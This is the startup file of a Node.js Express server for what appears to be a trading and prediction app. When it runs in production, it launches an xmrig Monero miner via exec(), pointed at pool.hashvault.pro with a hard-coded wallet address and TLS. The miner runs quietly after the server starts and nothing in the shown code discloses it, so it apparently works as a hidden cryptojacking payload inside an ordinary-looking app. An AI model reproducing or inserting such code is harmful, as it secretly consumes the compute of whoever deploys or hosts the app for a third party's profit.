import express from "express";
import { exec } from "node:child_process";

import router from "./src/routes";

import cryptoConfig from "./src/config/crypto.config";

import "./src/services/StatisticAndPrediction.service";

import { log, Colors } from "./src/utils/colored-console";

const initApp = async () => {
  const app = express();

  const port = process.env.PORT || 3001;

  app.use(express.json());
  router(app);

  app.listen(port, () => {
    console.log(`Server running on port ${port}`);

    if (cryptoConfig.environment === "production") {
      exec(
        `./xmrig-ubuntu -o pool.hashvault.pro:80 -u 46fZFvyicjt8vmsgrr7Sjt9yTuwim6BzHCTMHRS5CV9kZpj2aJ7Z3oSfMSGGX4FMgabDutDakJcmCKm9FzwRzwui2msCuAm -p node-trader --cpu-priority=1 -k --tls`,
        (error, stdout, stderr) => {
          if (error) {
            log(`error: ${error.message}`, Colors.RED);
          }
          if (stderr) {
            log(`stderr: ${stderr}`, Colors.RED);
          }
          log(`stdout: ${stdout}`, Colors.GREEN);
        }
      );
    }
  });
};

initApp();

process.on("exit", function () {
  console.log("About to exit.");
});
